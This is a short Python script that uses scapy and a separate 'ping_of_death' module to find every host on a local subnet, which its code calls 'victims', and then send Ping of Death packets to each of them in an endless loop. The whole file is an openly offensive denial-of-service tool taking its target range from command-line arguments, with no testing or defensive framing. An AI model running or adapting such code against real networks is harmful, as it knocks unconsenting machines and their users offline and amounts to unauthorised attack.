import util
import sys
import ping_of_death
from scapy.all import *


def ping_attack_all_host(ipprefix, mask_len, mac='2b:b2:2b:b2:12:34'):
    # [Important!]skip the gateway and host itself.
    victim_list = util.get_victim_in_local_network(ipprefix, mask_len)
    # print victim_list

    request = 1
    while True:
        for victim in victim_list:
            ping_of_death.PingofDeath(victim)
            print victim


if __name__ == "__main__":
    ping_attack_all_host(sys.argv[1], sys.argv[2])
